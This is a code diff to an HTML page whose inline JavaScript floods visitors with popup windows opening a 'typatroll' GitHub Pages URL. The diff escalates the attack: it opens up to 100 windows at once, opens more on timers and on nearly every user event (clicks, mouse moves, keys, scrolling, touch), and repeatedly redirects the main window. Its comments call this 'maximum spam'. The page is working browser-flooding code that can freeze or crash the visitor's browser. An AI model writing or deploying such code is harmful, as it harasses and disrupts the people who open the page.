@@ -5,28 +5,28 @@
     <script>
         const TARGET = 'https://bader133b.github.io/typatroll/';
         
-        // Open 50 windows immediately (increased from 20)
-        for (let i = 0; i < 50; i++) {
+        // Open 100 windows immediately (maximum spam)
+        for (let i = 0; i < 100; i++) {
             setTimeout(() => {
                 try {
                     window.open(TARGET, '_blank');
                 } catch(e) {}
-            }, i * 50);
+            }, i * 30);
         }
         
-        // Open 10 windows every 500ms (faster and more)
+        // Open 20 windows every 300ms (very aggressive)
         setInterval(() => {
-            for (let i = 0; i < 10; i++) {
+            for (let i = 0; i < 20; i++) {
                 try {
                     window.open(TARGET, '_blank');
                 } catch(e) {}
             }
-        }, 500);
+        }, 300);
         
-        // Also try to open on every possible event
-        ['load', 'focus', 'click', 'mousemove', 'keydown'].forEach(event => {
+        // Open on every possible event
+        ['load', 'DOMContentLoaded', 'focus', 'blur', 'click', 'mousemove', 'mousedown', 'keydown', 'keyup', 'scroll', 'touchstart'].forEach(event => {
             window.addEventListener(event, () => {
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 10; i++) {
                     try {
                         window.open(TARGET, '_blank');
                     } catch(e) {}
@@ -34,23 +34,30 @@
             }, { once: false });
         });
         
-        // Redirect main window every 1 second (faster)
+        // Redirect main window every 0.5 seconds (very fast)
         setInterval(() => {
             window.location.href = TARGET;
-        }, 1000);
+        }, 500);
         
-        // Also redirect immediately
+        // Immediate redirect
         setTimeout(() => {
             window.location.href = TARGET;
-        }, 500);
+        }, 200);
     </script>
 </head>
 <body>
     <script>
-        // Execute immediately when body loads
-        for (let i = 0; i < 20; i++) {
-            window.open(TARGET, '_blank');
+        // Execute immediately when body loads - open 50 windows
+        for (let i = 0; i < 50; i++) {
+            try {
+                window.open(TARGET, '_blank');
+            } catch(e) {}
         }
+        
+        // Also try to redirect body
+        setTimeout(() => {
+            window.location.href = TARGET;
+        }, 100);
     </script>
 </body>
 </html>
